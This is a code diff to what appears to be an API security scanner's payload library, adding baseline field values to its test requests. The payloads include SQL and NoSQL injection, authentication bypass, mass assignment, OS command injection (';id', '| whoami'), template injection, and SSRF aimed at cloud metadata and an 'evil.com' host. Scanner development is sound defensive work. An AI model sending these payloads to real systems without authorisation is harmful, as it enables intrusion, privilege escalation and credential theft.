@@ -50,6 +50,23 @@ function injectBodyForField(field: string, values: unknown[]): PayloadSpec[] {
   }));
 }
 
+function baselineValue(field: string): string {
+  const f = field.toLowerCase();
+  if (f.includes('email')) return 'scanner.test@example.com';
+  if (f.includes('password') || f === 'pass' || f === 'pwd') return 'Password123!';
+  if (f.includes('username') || f === 'user' || f.includes('login') || f.includes('handle')) return 'scanner_user';
+  if (f === 'name' || f.includes('full_name')) return 'Scanner User';
+  if (f.includes('phone')) return '5551234567';
+  if (f.includes('url') || f.includes('uri') || f.includes('link') || f.includes('webhook')) return 'https://example.com';
+  return 'test';
+}
+
+function buildBaselineBody(fields: string[]): Record<string, unknown> {
+  const base: Record<string, unknown> = {};
+  for (const field of fields) base[field] = baselineValue(field);
+  return base;
+}
+
 // ─── Library ──────────────────────────────────────────────────────────────────
 
 export const PAYLOAD_LIBRARY: Record<string, VulnClassConfig> = {
@@ -59,13 +76,14 @@ export const PAYLOAD_LIBRARY: Record<string, VulnClassConfig> = {
     payloads: (bodyFields, queryParams) => {
       const qp = queryParams[0] ?? 'id';
       const bf = bodyFields[0] ?? 'id';
+      const base = buildBaselineBody(bodyFields);
       return [
         { query: `?${qp}=1'+OR+'1'='1'--`, auth: 'bearer' },
         { query: `?${qp}=1'+UNION+SELECT+NULL,NULL--`, auth: 'bearer' },
         { query: `?${qp}=1';+SELECT+SLEEP(3)--`, auth: 'bearer' },
-        { body: JSON.stringify({ [bf]: "1 OR 1=1--" }), headers: JSON_HDR, auth: 'bearer' },
-        { body: JSON.stringify({ [bf]: "' OR 'x'='x" }), headers: JSON_HDR, auth: 'bearer' },
-        { body: JSON.stringify({ [bf]: "1; SELECT SLEEP(3)--" }), headers: JSON_HDR, auth: 'none' },
+        { body: JSON.stringify({ ...base, [bf]: "1 OR 1=1--" }), headers: JSON_HDR, auth: 'bearer' },
+        { body: JSON.stringify({ ...base, [bf]: "' OR 'x'='x" }), headers: JSON_HDR, auth: 'bearer' },
+        { body: JSON.stringify({ ...base, [bf]: "1; SELECT SLEEP(3)--" }), headers: JSON_HDR, auth: 'none' },
       ];
     },
     vuln_condition: `status === 200 && (body.includes("syntax error") || body.includes("ORA-") || body.includes("mysql_fetch") || body.includes("UNION") || body.includes("pg_catalog"))`,
@@ -77,10 +95,11 @@ export const PAYLOAD_LIBRARY: Record<string, VulnClassConfig> = {
       const f0 = bodyFields[0] ?? 'username';
       const f1 = bodyFields[1] ?? 'password';
       const qp = queryParams[0] ?? f0;
+      const base = buildBaselineBody(bodyFields);
       return [
-        { body: JSON.stringify({ [f0]: { '$gt': '' }, [f1]: { '$gt': '' } }), headers: JSON_HDR, auth: 'none' },
-        { body: JSON.stringify({ [f0]: { '$ne': null }, [f1]: { '$ne': null } }), headers: JSON_HDR, auth: 'none' },
-        { body: JSON.stringify({ [f0]: "admin'||'1'=='1" }), headers: JSON_HDR, auth: 'none' },
+        { body: JSON.stringify({ ...base, [f0]: { '$gt': '' }, [f1]: { '$gt': '' } }), headers: JSON_HDR, auth: 'none' },
+        { body: JSON.stringify({ ...base, [f0]: { '$ne': null }, [f1]: { '$ne': null } }), headers: JSON_HDR, auth: 'none' },
+        { body: JSON.stringify({ ...base, [f0]: "admin'||'1'=='1" }), headers: JSON_HDR, auth: 'none' },
         { query: `?${qp}[$ne]=x`, auth: 'none' },
       ];
     },
@@ -92,12 +111,13 @@ export const PAYLOAD_LIBRARY: Record<string, VulnClassConfig> = {
     payloads: (bodyFields) => {
       const f0 = bodyFields[0] ?? 'username';
       const f1 = bodyFields[1] ?? 'password';
+      const base = buildBaselineBody(bodyFields);
       return [
         { auth: 'none' },
         { headers: { 'Authorization': 'Bearer null' }, auth: 'none' },
         { headers: { 'Authorization': 'Bearer undefined' }, auth: 'none' },
         { headers: { 'Authorization': 'Bearer 0' }, auth: 'none' },
-        { body: JSON.stringify({ [f0]: "administrator'--", [f1]: 'anything' }), headers: JSON_HDR, auth: 'none' },
+        { body: JSON.stringify({ ...base, [f0]: "administrator'--", [f1]: 'anything' }), headers: JSON_HDR, auth: 'none' },
       ];
     },
     vuln_condition: `status === 200`,
@@ -153,12 +173,15 @@ export const PAYLOAD_LIBRARY: Record<string, VulnClassConfig> = {
 
   // ── Mass Assignment (PortSwigger: API Testing → Mass Assignment) ───────────
   mass_assignment: {
-    payloads: [
-      { body: JSON.stringify({ role: 'admin', isAdmin: true, is_admin: true, admin: true }), headers: JSON_HDR, auth: 'bearer' },
-      { body: JSON.stringify({ price: 0, discount: 100 }), headers: JSON_HDR, auth: 'bearer' },
-      { body: JSON.stringify({ balance: 999999 }), headers: JSON_HDR, auth: 'bearer' },
-      { body: JSON.stringify({ verified: true, emailVerified: true }), headers: JSON_HDR, auth: 'bearer' },
-    ],
+    payloads: (bodyFields) => {
+      const base = buildBaselineBody(bodyFields);
+      return [
+        { body: JSON.stringify({ ...base, role: 'admin', isAdmin: true, is_admin: true, admin: true }), headers: JSON_HDR, auth: 'bearer' },
+        { body: JSON.stringify({ ...base, price: 0, discount: 100 }), headers: JSON_HDR, auth: 'bearer' },
+        { body: JSON.stringify({ ...base, balance: 999999 }), headers: JSON_HDR, auth: 'bearer' },
+        { body: JSON.stringify({ ...base, verified: true, emailVerified: true }), headers: JSON_HDR, auth: 'bearer' },
+      ];
+    },
     vuln_condition: `status < 400`,
   },
 
@@ -195,11 +218,12 @@ export const PAYLOAD_LIBRARY: Record<string, VulnClassConfig> = {
     payloads: (bodyFields, queryParams) => {
       const bf = bodyFields[0] ?? 'host';
       const qp = queryParams[0] ?? 'cmd';
+      const base = buildBaselineBody(bodyFields);
       return [
-        { body: JSON.stringify({ [bf]: 'localhost; id' }), headers: JSON_HDR, auth: 'bearer' },
-        { body: JSON.stringify({ [bf]: 'localhost | whoami' }), headers: JSON_HDR, auth: 'bearer' },
-        { body: JSON.stringify({ [bf]: '127.0.0.1`id`' }), headers: JSON_HDR, auth: 'bearer' },
-        { body: JSON.stringify({ [bf]: 'localhost;sleep 3' }), headers: JSON_HDR, auth: 'bearer' },
+        { body: JSON.stringify({ ...base, [bf]: 'localhost; id' }), headers: JSON_HDR, auth: 'bearer' },
+        { body: JSON.stringify({ ...base, [bf]: 'localhost | whoami' }), headers: JSON_HDR, auth: 'bearer' },
+        { body: JSON.stringify({ ...base, [bf]: '127.0.0.1`id`' }), headers: JSON_HDR, auth: 'bearer' },
+        { body: JSON.stringify({ ...base, [bf]: 'localhost;sleep 3' }), headers: JSON_HDR, auth: 'bearer' },
         { query: `?${qp}=whoami`, auth: 'bearer' },
       ];
     },
@@ -211,11 +235,12 @@ export const PAYLOAD_LIBRARY: Record<string, VulnClassConfig> = {
     payloads: (bodyFields, queryParams) => {
       const bf = bodyFields[0] ?? 'name';
       const qp = queryParams[0] ?? 'template';
+      const base = buildBaselineBody(bodyFields);
       return [
-        { body: JSON.stringify({ [bf]: '{{7*7}}' }), headers: JSON_HDR, auth: 'bearer' },
-        { body: JSON.stringify({ [bf]: '${7*7}' }), headers: JSON_HDR, auth: 'bearer' },
-        { body: JSON.stringify({ [bf]: '<%= 7*7 %>' }), headers: JSON_HDR, auth: 'bearer' },
-        { body: JSON.stringify({ [bf]: '#{7*7}' }), headers: JSON_HDR, auth: 'bearer' },
+        { body: JSON.stringify({ ...base, [bf]: '{{7*7}}' }), headers: JSON_HDR, auth: 'bearer' },
+        { body: JSON.stringify({ ...base, [bf]: '${7*7}' }), headers: JSON_HDR, auth: 'bearer' },
+        { body: JSON.stringify({ ...base, [bf]: '<%= 7*7 %>' }), headers: JSON_HDR, auth: 'bearer' },
+        { body: JSON.stringify({ ...base, [bf]: '#{7*7}' }), headers: JSON_HDR, auth: 'bearer' },
         { query: `?${qp}={{7*7}}`, auth: 'bearer' },
         { query: `?${qp}=%7B%7B7*7%7D%7D`, auth: 'bearer' },
       ];
@@ -227,12 +252,13 @@ export const PAYLOAD_LIBRARY: Record<string, VulnClassConfig> = {
   ssrf: {
     payloads: (bodyFields, queryParams) => {
       const bf = bodyFields.find((f) => /url|uri|link|src|href|redirect|callback|webhook/i.test(f)) ?? bodyFields[0] ?? 'url';
+      const base = buildBaselineBody(bodyFields);
       return [
-        { body: JSON.stringify({ [bf]: 'http://169.254.169.254/latest/meta-data/' }), headers: JSON_HDR, auth: 'bearer' },
-        { body: JSON.stringify({ [bf]: 'http://localhost:22' }), headers: JSON_HDR, auth: 'bearer' },
-        { body: JSON.stringify({ [bf]: 'http://127.0.0.1:80' }), headers: JSON_HDR, auth: 'bearer' },
-        { body: JSON.stringify({ [bf]: 'http://[::1]/admin' }), headers: JSON_HDR, auth: 'bearer' },
-        { body: JSON.stringify({ [bf]: 'http://169.254.169.254@evil.com/' }), headers: JSON_HDR, auth: 'bearer' },
+        { body: JSON.stringify({ ...base, [bf]: 'http://169.254.169.254/latest/meta-data/' }), headers: JSON_HDR, auth: 'bearer' },
+        { body: JSON.stringify({ ...base, [bf]: 'http://localhost:22' }), headers: JSON_HDR, auth: 'bearer' },
+        { body: JSON.stringify({ ...base, [bf]: 'http://127.0.0.1:80' }), headers: JSON_HDR, auth: 'bearer' },
+        { body: JSON.stringify({ ...base, [bf]: 'http://[::1]/admin' }), headers: JSON_HDR, auth: 'bearer' },
+        { body: JSON.stringify({ ...base, [bf]: 'http://169.254.169.254@evil.com/' }), headers: JSON_HDR, auth: 'bearer' },
       ];
     },
     vuln_condition: `status === 200 && (body.includes("ami-id") || body.includes("SSH") || body.includes("meta-data") || body.length > 500)`,
